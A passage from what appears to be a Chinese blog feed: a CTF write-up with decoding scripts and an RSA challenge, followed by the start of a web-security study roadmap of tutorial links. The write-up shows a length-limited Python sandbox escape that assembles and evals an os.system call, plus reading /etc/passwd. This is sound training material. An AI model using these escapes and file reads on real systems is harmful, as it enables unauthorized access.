src="/img/image-20240311184628724.png"></p><p><img src="/img/image-20240311184650642.png"></p><p>4.把数据提出来后，观察JavaScript函数，前面就是说明是异或，后面就是异或前后的数据，是从一个地方提取的，只不过分一个先后，大概就是a[i] ^ a[i-1] ,一直执行，但一开始我以为是一个一个的前后异或就好，但出来的是乱码，后来发现是要把异或后的数据放入a[i]才可以后续异或</p><p><img src="/img/image-20240311184701020.png"></p><pre><code class="Python">secret = [102,10,13,6, 28,74,3, 1, 3, 7, 85,0, 4, 75,20,92,92,8, 28,25,81,83,7, 28,76,88,9, 0, 29,73,0, 86,4, 87,87,82,84,85,4, 85,87,30]key = [102,10,13,6,28,20,48,44,27,1,29,43,54,54,59,11,1,26,43,52,5,1,24,40,43,28,9,21,9]result = []for i in range(1,len(secret)):    secret[i] ^= secret[i-1]    print(chr(secret[i]),end=&#39;&#39;)</code></pre><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h3 id="签到卡"><a href="#签到卡" class="headerlink" title="签到卡"></a>签到卡</h3><p>提示是print(open(’&#x2F;etc&#x2F;passwd’).read())</p><p>存在任意文件读取</p><p>猜测flag在根目录</p><p>print(open(’&#x2F;flag’).read())</p><p>打印出flag</p><h3 id="国粹"><a href="#国粹" class="headerlink" title="国粹"></a>国粹</h3><p>国粹麻将，但是不会打麻将也可以做</p><p>a.png和k.png分别是x和y轴坐标</p><pre><code class="PHP"># 导入PIL库中的Image模块from PIL import Image# 设置单元格的宽度和高度ew, eh = 53, 73# 打开题目图像文件，并获取其大小table_pic = Image.open(&#39;题目.png&#39;)ti_w, ti_h = table_pic.size# 创建一个长度为42的列表，用于存储所有单元格的颜色值color = [0] * 42# 遍历所有单元格，提取每个单元格的颜色值for i in range(1, 43):    pic = []    for y in range(eh):        for x in range(ew):            # 获取指定位置的像素值，并将其第一个元素（即红色通道的值）添加到pic列表中            pic.append(table_pic.getpixel((53*i + x, y))[0])    color[i-1] = pic# 打开包含字母K的图像文件，并获取其大小k_pic = Image.open(&#39;k.png&#39;)k_w, k_h = k_pic.size# 创建一个空列表，用于存储包含字母K的单元格在网格中的索引flag_ind = []# 遍历包含字母K的图像文件中的所有单元格for i in range(k_w // 53):    pic = []    for y in range(eh):        for x in range(ew):            # 获取指定位置的像素值，并将其第一个元素（即红色通道的值）添加到pic列表中            pic.append(k_pic.getpixel((53*i + x, y))[0])    # 找到pic在color列表中的索引，即相应单元格的索引，并将其添加到flag_ind列表中    ind = color.index(pic)    flag_ind.append(ind)# 打开包含字母A的图像文件，并获取其大小a_pic = Image.open(&#39;a.png&#39;)a_w, a_h = a_pic.size# 创建一个空列表，用于存储包含字母A的单元格在网格中的索引a_ind = []# 遍历包含字母A的图像文件中的所有单元格for i in range(a_w // 53):    pic = []    for y in range(eh):        for x in range(ew):            # 获取指定位置的像素值，并将其第一个元素（即红色通道的值）添加到pic列表中            pic.append(a_pic.getpixel((53*i + x, y))[0])    # 找到pic在color列表中的索引，即相应单元格的索引，并将其添加到a_ind列表中    ind = color.index(pic)    a_ind.append(ind)# 创建一个新的灰度图像，大小为42x42像素，初始化为所有像素都设置为白色（即值为255）new_pic = Image.new(&#39;L&#39;, (42, 42), 255)# 遍历包含字母A的单元格在网格中的索引，将相应的像素设置为黑色（即值为0）for i in range(len(a_ind)):    # 根据flag_ind和a_ind列表中的索引，设置相应位置的像素为黑色    new_pic.putpixel((flag_ind[i], a_ind[i]), 0)# 显示生成的图像new_pic.show()</code></pre><p><img src="/img/image-20240311184718242.png"></p><p>flag{202305012359}</p><p>脚本2：</p><pre><code class="Python">import matplotlib.pyplot as pltdata = [(1,4),(1,5),(1,10),(1,30),(2,3),(2,4),(2,5),(2,6),(2,10),(2,29),(2,30),(3,3),(3,4),(3,10),(3,16),(3,17),(3,22),(3,23),(3,24),(3,25),(3,29),(3,30),(4,2),(4,3),(4,4),(4,5),(4,10),(4,15),(4,16),(4,18),(4,21),(4,22),(4,24),(4,25),(4,29),(4,30),(5,3),(5,4),(5,10),(5,15),(5,17),(5,18),(5,19),(5,21),(5,22),(5,25),(5,28),(5,29),(6,3),(6,4),(6,10),(6,15),(6,16),(6,18),(6,19),(6,21),(6,22),(6,25),(6,29),(7,3),(7,4),(7,10),(7,11),(7,12),(7,13),(7,15),(7,18),(7,19),(7,22),(7,23),(7,24),(7,25),(7,29),(7,30),(8,3),(8,4),(8,11),(8,12),(8,15),(8,16),(8,17),(8,18),(8,19),(8,20),(8,25),(8,29),(8,30),(9,21),(9,22),(9,24),(9,25),(9,30),(9,31),(10,23),(10,24),(12,22),(12,23),(12,24),(12,25),(13,2),(13,3),(13,4),(13,5),(13,9),(13,10),(13,11),(13,12),(13,16),(13,17),(13,18),(13,19),(13,24),(13,25),(14,2),(14,5),(14,6),(14,9),(14,12),(14,19),(14,23),(14,24),(15,5),(15,9),(15,12),(15,18),(15,19),(15,22),(15,23),(16,4),(16,5),(16,9),(16,12),(16,17),(16,18),(16,23),(16,24),(17,3),(17,4),(17,9),(17,12),(17,16),(17,17),(17,24),(17,25),(18,3),(18,9),(18,12),(18,16),(18,25),(19,3),(19,4),(19,5),(19,6),(19,9),(19,10),(19,11),(19,12),(19,16),(19,17),(19,18),(19,19),(19,21),(19,22),(19,23),(19,24),(19,25),(20,10),(20,11),(22,3),(22,4),(22,5),(22,6),(22,10),(22,11),(22,12),(22,17),(22,18),(22,19),(22,24),(22,25),(23,3),(23,6),(23,7),(23,9),(23,10),(23,16),(23,17),(23,19),(23,20),(23,22),(23,23),(23,24),(23,25),(24,3),(24,6),(24,7),(24,9),(24,10),(24,16),(24,19),(24,20),(24,24),(24,25),(25,3),(25,6),(25,7),(25,10),(25,11),(25,12),(25,16),(25,19),(25,20),(25,24),(25,25),(26,3),(26,6),(26,7),(26,12),(26,13),(26,16),(26,19),(26,20),(26,24),(26,25),(27,3),(27,6),(27,7),(27,9),(27,12),(27,13),(27,16),(27,19),(27,20),(27,24),(27,25),(28,3),(28,4),(28,6),(28,9),(28,10),(28,11),(28,12),(28,16),(28,17),(28,19),(28,20),(28,24),(28,25),(29,4),(29,5),(29,17),(29,18),(29,19),(31,10),(31,11),(31,12),(31,13),(31,25),(31,31),(32,4),(32,5),(32,6),(32,10),(32,11),(32,12),(32,13),(32,17),(32,18),(32,19),(32,23),(32,24),(32,25),(32,26),(32,32),(33,3),(33,4),(33,6),(33,7),(33,12),(33,16),(33,17),(33,23),(33,24),(33,26),(33,32),(34,6),(34,7),(34,11),(34,16),(34,17),(34,23),(34,24),(34,26),(34,32),(35,6),(35,11),(35,12),(35,17),(35,18),(35,19),(35,23),(35,24),(35,25),(35,26),(35,33),(36,5),(36,12),(36,13),(36,19),(36,20),(36,26),(36,32),(37,4),(37,5),(37,13),(37,16),(37,19),(37,20),(37,25),(37,26),(37,32),(38,4),(38,5),(38,6),(38,7),(38,9),(38,10),(38,11),(38,12),(38,13),(38,16),(38,17),(38,18),(38,19),(38,24),(38,25),(38,31),(38,32),(39,23),(39,24),(39,31)]# 将 x 和 y 分别取出x_data = [d[0] for d in data]y_data = [d[1] for d in data]# 绘制散点图plt.scatter(x_data, y_data)# 添加标题和坐标轴标签plt.title(&quot;A simple scatter plot&quot;)plt.xlabel(&quot;X-axis label&quot;)plt.ylabel(&quot;Y-axis label&quot;)# 显示图形plt.show()</code></pre><h3 id="被加密的生产流量"><a href="#被加密的生产流量" class="headerlink" title="被加密的生产流量"></a>被加密的生产流量</h3><p><strong>题目名字是误导</strong></p><p>tcp第0流有base32加密密文</p><p><img src="/img/image-20240311184737061.png"></p><blockquote><p>MMYWMX3GNEYWOXZRGAYDA&#x3D;&#x3D;&#x3D;</p><p>c1f_fi1g_1000</p></blockquote><h3 id="pyshell"><a href="#pyshell" class="headerlink" title="pyshell"></a>pyshell</h3><p>这是一个python的命令窗口</p><p>但是限制了输入长度</p><p><img src="/img/image-20240311184759082.png"></p><p>所以可以通过_+”__”获取一个字符串变量 可以不断拼接绕过7个字符的限制</p><p><img src="/img/image-20240311184838406.png"></p><p>最长只能7位</p><p>eg:</p><p>依次输入’__imp’和 _+’ort’ 将字符串 拼接成</p><p><img src="/img/image-20240311184849609.png"></p><p>依次输入以下命令拿到flag</p><pre><code class="Python">&#39;__imp&#39;_+&#39;ort&#39;_+&#39;__(&#39;_+&quot;&#39;os&quot;_+&quot;&#39;).&quot;_+&quot;sys&quot;_+&quot;tem&quot;_+&quot;(&#39;c&quot;_+&quot;at &quot;_+&quot;/fl&quot;_+&quot;ag&#39;&quot;_+&quot;)&quot;eval(_)</code></pre><p><img src="/img/image-20240311184905259.png"></p><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h3 id="Sign-in-passwd"><a href="#Sign-in-passwd" class="headerlink" title="Sign_in_passwd"></a>Sign_in_passwd</h3><blockquote><p>j2rXjx8yjd&#x3D;YRZWyTIuwRdbyQdbqR3R9iZmsScutj2iqj3&#x2F;tidj1jd&#x3D;D</p><p>GHI3KLMNJOPQRSTUb%3DcdefghijklmnopWXYZ%2F12%2B406789VaqrstuvwxyzABCDEF5</p></blockquote><p>附件的两段</p><p>第二段url decode解码</p><blockquote><p>GHI3KLMNJOPQRSTUb&#x3D;cdefghijklmnopWXYZ&#x2F;12+406789VaqrstuvwxyzABCDEF5</p></blockquote><p>当第一段的base64码表</p><p>把base的基本的码表为：A–Z,a–z,0–9,+,&#x2F; 替换成url解码出来的码表</p><p><img src="/img/image-20240311184935022.png"></p><h3 id="可信度量"><a href="#可信度量" class="headerlink" title="可信度量"></a>可信度量</h3><ul><li><p>直接grep搜索一下：</p></li><li><p>grep -r “flag{“ &#x2F;</p></li></ul><p>末尾得到搜索到的文件结果，直接cat即可得到Flag。</p><h3 id="基于国密SM2算法的密钥密文分发"><a href="#基于国密SM2算法的密钥密文分发" class="headerlink" title="基于国密SM2算法的密钥密文分发"></a>基于国密SM2算法的密钥密文分发</h3><p>上传名字，学校拿到 id </p><p>上传公钥</p><p>然后访问&#x2F;api&#x2F;quantum接口获取密文</p><p> 查看新信息，直接访问&#x2F;api&#x2F;search接口 上传 quantumStringServer 的内容即可</p><h3 id="babykey1"><a href="#babykey1" class="headerlink" title="babykey1"></a>babykey1</h3><pre><code class="Python">from Crypto.Util.number import *from Crypto.PublicKey import RSAfrom hashlib import sha256import random, os, signal, stringdef proof_of_work():    random.seed(os.urandom(8))    proof = &#39;&#39;.join([random.choice(string.ascii_letters+string.digits) for _ in range(20)])    _hexdigest = sha256(proof.encode()).hexdigest()    print(f&quot;sha256(XXXX+&#123;proof[4:]&#125;) == &#123;_hexdigest&#125;&quot;)    print(&#39;Give me XXXX: &#39;)    x = input()    if len(x) != 4 or sha256(x.encode()+proof[4:].encode()).hexdigest() != _hexdigest:        print(&#39;Wrong PoW&#39;)        return False    return Trueif not proof_of_work():    exit(1)    signal.alarm(10)print(&quot;Give me a bad RSA keypair.&quot;)try:    p = int(input(&#39;p = &#39;))    q = int(input(&#39;q = &#39;))    assert p &gt; 0    assert q &gt; 0    assert p != q    assert p.bit_length() == 512    assert q.bit_length() == 512    assert isPrime(p)    assert isPrime(q)    n = p * q    e = 65537    assert p % e != 1    assert q % e != 1    d = inverse(e, (p-1)*(q-1))except:    print(&quot;Invalid params&quot;)    exit(2)try:    key = RSA.construct([n,e,d,p,q])    print(&quot;This is not a bad RSA keypair.&quot;)    exit(3)except KeyboardInterrupt:    print(&quot;Hacker detected.&quot;)    exit(4)except ValueError:    print(&quot;How could this happen?&quot;)    from secret import flag    print(flag)</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> WP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>暑假学习路线</title>
      <link href="/2023/01/02/%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/"/>
      <url>/2023/01/02/%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><strong>详细路线可看飞书知识库</strong></p><p>在这个假期中希望大家能在娱乐的同时进行自主学习</p><p>根据自己情况制定自己详细学习计划</p><p>每天进步一点点让优秀逐渐成为一种习惯！！！</p><blockquote><p>提问的智慧<a href="https://github.com/ryanhanwu/How-To-Ask-Questions-The-Smart-Way/blob/main/README-zh_CN.md?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgyMjYyMzIsImZpbGVHVUlEIjoiMWQzYVY2YXI1WFNZNnhxZyIsImlhdCI6MTY5ODIyNTkzMiwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo4NzA1NjA0Nn0.zmDlOHi0_8aODca7O_hYKMK9wvgCr_IKSJ8KyXMp8sY">https://github.com/ryanhanwu/How-To-Ask-Questions-The-Smart-Way/blob/main/README-zh_CN.md</a></p></blockquote><p>PS:以下根据自己的学习方法来，如果觉得看字太慢的话，可以看视频，不管咋学都要记笔记</p><h1 id="编程语言"><a href="#编程语言" class="headerlink" title="编程语言"></a>编程语言</h1><p>​    学编程语言一定要跟着教程练习，看完视频后尝试自己进行视频中的编程练习，只有自己写出来，才能证明初步的掌握</p><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><p>视频教程：<a href="https://www.bilibili.com/video/BV18x411H7qD/?spm_id_from=333.337.search-card.all.click&vd_source=2f052fce642dbd0a501d0be0c16952be&accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgyMjYyMzIsImZpbGVHVUlEIjoiMWQzYVY2YXI1WFNZNnhxZyIsImlhdCI6MTY5ODIyNTkzMiwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo4NzA1NjA0Nn0.zmDlOHi0_8aODca7O_hYKMK9wvgCr_IKSJ8KyXMp8sY">黑马程序员</a></p><p>文字教程：<a href="https://www.runoob.com/php/php-tutorial.html?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgyMjYyMzIsImZpbGVHVUlEIjoiMWQzYVY2YXI1WFNZNnhxZyIsImlhdCI6MTY5ODIyNTkzMiwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo4NzA1NjA0Nn0.zmDlOHi0_8aODca7O_hYKMK9wvgCr_IKSJ8KyXMp8sY">菜鸟教程</a></p><p>ps：php是我们web最基础的语言了，基础漏洞都是从php开始的，学好了往下学java，Python啥的才容易一点</p><h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><p>视频教程：<a href="https://www.bilibili.com/video/BV16A411i7W7?p=1&vd_source=2f052fce642dbd0a501d0be0c16952be&accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgyMjYyMzIsImZpbGVHVUlEIjoiMWQzYVY2YXI1WFNZNnhxZyIsImlhdCI6MTY5ODIyNTkzMiwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo4NzA1NjA0Nn0.zmDlOHi0_8aODca7O_hYKMK9wvgCr_IKSJ8KyXMp8sY">两小时速成</a></p><p>文字教程：<a href="https://www.liaoxuefeng.com/wiki/1016959663602400?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgyMjYyMzIsImZpbGVHVUlEIjoiMWQzYVY2YXI1WFNZNnhxZyIsImlhdCI6MTY5ODIyNTkzMiwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo4NzA1NjA0Nn0.zmDlOHi0_8aODca7O_hYKMK9wvgCr_IKSJ8KyXMp8sY">廖雪峰</a></p><p>ps：Python的话还是比较重要的，虽然web中偶尔也有Python的漏洞但Python主要还是misc用来写脚本，各种乱七八糟的脚本，要想摆脱脚本小子的称号就一定要会写脚本，所以也一定要学会python</p><h2 id="java"><a href="#java" class="headerlink" title="java"></a>java</h2><p>视频教程：<a href="https://www.bilibili.com/video/BV12J41137hu/?spm_id_from=333.337.search-card.all.click&vd_source=2f052fce642dbd0a501d0be0c16952be&accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgyMjYyMzIsImZpbGVHVUlEIjoiMWQzYVY2YXI1WFNZNnhxZyIsImlhdCI6MTY5ODIyNTkzMiwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo4NzA1NjA0Nn0.zmDlOHi0_8aODca7O_hYKMK9wvgCr_IKSJ8KyXMp8sY">狂神说java</a></p><p>文字教程：<a href="https://www.runoob.com/java/java-basic-syntax.html?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgyMjYyMzIsImZpbGVHVUlEIjoiMWQzYVY2YXI1WFNZNnhxZyIsImlhdCI6MTY5ODIyNTkzMiwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo4NzA1NjA0Nn0.zmDlOHi0_8aODca7O_hYKMK9wvgCr_IKSJ8KyXMp8sY">菜鸟教程</a></p><h2 id="主要为Java"><a href="#主要为Java" class="headerlink" title="主要为Java"></a>主要为Java</h2><p>（<strong>慢学，细学</strong></p><p><a href="https://www.bilibili.com/video/BV12J411M7Sj/?spm_id_from=333.337.search-card.all.click&vd_source=2f052fce642dbd0a501d0be0c16952be">狂神说java</a></p><h2 id="java反序列化—（白日梦组长）"><a href="#java反序列化—（白日梦组长）" class="headerlink" title="java反序列化—（白日梦组长）"></a>java反序列化—（白日梦组长）</h2><p><a href="https://www.bilibili.com/video/BV16h411z7o9/?spm_id_from=333.337.search-card.all.click&vd_source=2f052fce642dbd0a501d0be0c16952be">视频</a></p><p><a href="https://blog.csdn.net/mocas_wang/article/details/107621010?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169129638316800182752446%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=169129638316800182752446&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-9-107621010-null-null.142%5Ev92%5EchatgptT3_1&utm_term=java%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1018.2226.3001.4187">java基础漏洞</a></p><p><strong>先基础篇-&gt;cc链 1 6 3</strong></p><p><a href="https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.999.0.0&vd_source=2f052fce642dbd0a501d0be0c16952be">https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.999.0.0&amp;vd_source=2f052fce642dbd0a501d0be0c16952be</a></p><h2 id="下面是一些暂放的另外学习方向"><a href="#下面是一些暂放的另外学习方向" class="headerlink" title="下面是一些暂放的另外学习方向"></a>下面是一些暂放的另外学习方向</h2><h3 id="nodejs原型链污染"><a href="#nodejs原型链污染" class="headerlink" title="nodejs原型链污染"></a>nodejs原型链污染</h3><h3 id="go"><a href="#go" class="headerlink" title="go"></a>go</h3><h3 id="来自佬的建议"><a href="#来自佬的建议" class="headerlink" title="来自佬的建议"></a>来自佬的建议</h3><p>GO学得好，也可以转开发，现在安全类的开发基本都是go python</p><h3 id="反序列化字符串逃逸"><a href="#反序列化字符串逃逸" class="headerlink" title="反序列化字符串逃逸"></a>反序列化字符串逃逸</h3><h2 id="PS-入门阶段不需要精通，会写一些简单的代码即可，不要把重点放在编程上！！！"><a href="#PS-入门阶段不需要精通，会写一些简单的代码即可，不要把重点放在编程上！！！" class="headerlink" title="PS : 入门阶段不需要精通，会写一些简单的代码即可，不要把重点放在编程上！！！"></a>PS : 入门阶段不需要精通，会写一些简单的代码即可，不要把重点放在编程上！！！</h2><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ol><li><p>熟悉Linux基本命令（<a href="https://shimo.im/docs/vrTgvx8c8kWwx998/?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgyMjYyMzIsImZpbGVHVUlEIjoiMWQzYVY2YXI1WFNZNnhxZyIsImlhdCI6MTY5ODIyNTkzMiwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo4NzA1NjA0Nn0.zmDlOHi0_8aODca7O_hYKMK9wvgCr_IKSJ8KyXMp8sY">https://shimo.im/docs/vrTgvx8c8kWwx998</a>）    Debian、Ubuntu、Centos这些系统尽管命令不是全部相同，但是大体一致</p></li><li><p>尽量熟练的使用windows中phpstudy</p></li></ol><p><a href="https://www.bilibili.com/video/BV1s24y1C7L2/?spm_id_from=333.337.search-card.all.click&vd_source=2f052fce642dbd0a501d0be0c16952be&accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgyMjYyMzIsImZpbGVHVUlEIjoiMWQzYVY2YXI1WFNZNnhxZyIsImlhdCI6MTY5ODIyNTkzMiwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo4NzA1NjA0Nn0.zmDlOHi0_8aODca7O_hYKMK9wvgCr_IKSJ8KyXMp8sY">一个简单的例子，教你本地搭建了一个网站</a></p><ol><li><p>linux系统Apache&#x2F;Nginx+PHP+Mysql的配置，完成LAMP或者LNMP搭建</p></li><li><p>docker<a href="https://www.bilibili.com/video/BV1og4y1q7M4/?spm_id_from=333.337.search-card.all.click&accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgyMjYyMzIsImZpbGVHVUlEIjoiMWQzYVY2YXI1WFNZNnhxZyIsImlhdCI6MTY5ODIyNTkzMiwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo4NzA1NjA0Nn0.zmDlOHi0_8aODca7O_hYKMK9wvgCr_IKSJ8KyXMp8sY">https://www.bilibili.com/video/BV1og4y1q7M4/?spm_id_from&#x3D;333.337.search-card.all.click</a></p></li></ol><p>PS：在命令执行学习时顺便掌握linux的基本命令的使用；LNMP的搭建在学习编程语言之余完成即可，在之后的环境搭建、题目复现中都会经常使用，3或者4的环境搭建还是建议学习之余搭建，比较麻烦</p><h1 id="漏洞学习"><a href="#漏洞学习" class="headerlink" title="漏洞学习"></a>漏洞学习</h1><p>前四个漏洞建议大家一个周完成一个漏洞的学习，剩下的漏洞建议两周一个，根据个人的学习情况不同，时间可以由自己来定，学习快的同学一定要继续往下学习，CTF是入门好方法，之后的比赛也是CTF。视频教程：<a href="https://www.zhaoj.in/read-6321.html?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgyMjYyMzIsImZpbGVHVUlEIjoiMWQzYVY2YXI1WFNZNnhxZyIsImlhdCI6MTY5ODIyNTkzMiwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo4NzA1NjA0Nn0.zmDlOHi0_8aODca7O_hYKMK9wvgCr_IKSJ8KyXMp8sY">https://www.zhaoj.in/read-6321.html</a></p><ol><li>命令&#x2F;代码执行</li></ol><p>文字教程：<a href="https://blog.csdn.net/m0_55854679/article/details/119543746?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgyMjYyMzIsImZpbGVHVUlEIjoiMWQzYVY2YXI1WFNZNnhxZyIsImlhdCI6MTY5ODIyNTkzMiwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo4NzA1NjA0Nn0.zmDlOHi0_8aODca7O_hYKMK9wvgCr_IKSJ8KyXMp8sY">https://blog.csdn.net/m0_55854679&#x2F;article&#x2F;details&#x2F;119543746</a></p><p>视频教程：<a href="https://www.bilibili.com/video/BV1Eb4y1y7rj/?spm_id_from=333.337.search-card.all.click&accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgyMjYyMzIsImZpbGVHVUlEIjoiMWQzYVY2YXI1WFNZNnhxZyIsImlhdCI6MTY5ODIyNTkzMiwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo4NzA1NjA0Nn0.zmDlOHi0_8aODca7O_hYKMK9wvgCr_IKSJ8KyXMp8sY">https://www.bilibili.com/video/BV1Eb4y1y7rj/?spm_id_from&#x3D;333.337.search-card.all.click</a></p><p>建议配合靶场学习：</p><ul><li><p>ctfhub中的rce</p></li><li><p>ctfhsow的命令执行：<a href="https://blog.csdn.net/weixin_44770698/article/details/125460386?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgyMjYyMzIsImZpbGVHVUlEIjoiMWQzYVY2YXI1WFNZNnhxZyIsImlhdCI6MTY5ODIyNTkzMiwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo4NzA1NjA0Nn0.zmDlOHi0_8aODca7O_hYKMK9wvgCr_IKSJ8KyXMp8sY">https://blog.csdn.net/weixin_44770698&#x2F;article&#x2F;details&#x2F;125460386</a></p></li></ul><ol><li>文件上传漏洞</li></ol><p>文字教程：<a href="https://blog.csdn.net/ma963852/article/details/123085437?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgyMjYyMzIsImZpbGVHVUlEIjoiMWQzYVY2YXI1WFNZNnhxZyIsImlhdCI6MTY5ODIyNTkzMiwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo4NzA1NjA0Nn0.zmDlOHi0_8aODca7O_hYKMK9wvgCr_IKSJ8KyXMp8sY">https://blog.csdn.net/ma963852/article/details/123085437</a></p><p>视频教程：<a href="https://www.bilibili.com/video/BV1mf4y137Ac/?spm_id_from=333.337.search-card.all.click&vd_source=2f052fce642dbd0a501d0be0c16952be&accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgyMjYyMzIsImZpbGVHVUlEIjoiMWQzYVY2YXI1WFNZNnhxZyIsImlhdCI6MTY5ODIyNTkzMiwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo4NzA1NjA0Nn0.zmDlOHi0_8aODca7O_hYKMK9wvgCr_IKSJ8KyXMp8sY">https://www.bilibili.com/video/BV1mf4y137Ac/?spm_id_from&#x3D;333.337.search-card.all.click&amp;vd_source&#x3D;2f052fce642dbd0a501d0be0c16952be</a></p><p>靶场：</p><ul><li><p>github：<a href="https://github.com/c0ny1/upload-labs?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgyMjYyMzIsImZpbGVHVUlEIjoiMWQzYVY2YXI1WFNZNnhxZyIsImlhdCI6MTY5ODIyNTkzMiwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo4NzA1NjA0Nn0.zmDlOHi0_8aODca7O_hYKMK9wvgCr_IKSJ8KyXMp8sY">https://github.com/c0ny1/upload-labs</a>源码自行搭建</p></li><li><p>buuctf里有已经搭建好的靶场</p></li><li><p>ctfhub中的文件上传</p></li></ul><ol><li>文件包含漏洞</li></ol><p>文字教程：<a href="https://baijiahao.baidu.com/s?id=1726903453533609734&wfr=spider&for=pc&accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgyMjYyMzIsImZpbGVHVUlEIjoiMWQzYVY2YXI1WFNZNnhxZyIsImlhdCI6MTY5ODIyNTkzMiwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo4NzA1NjA0Nn0.zmDlOHi0_8aODca7O_hYKMK9wvgCr_IKSJ8KyXMp8sY">https://baijiahao.baidu.com/s?id=1726903453533609734&wfr=spider&for=pc</a></p><p>视频教程：<a 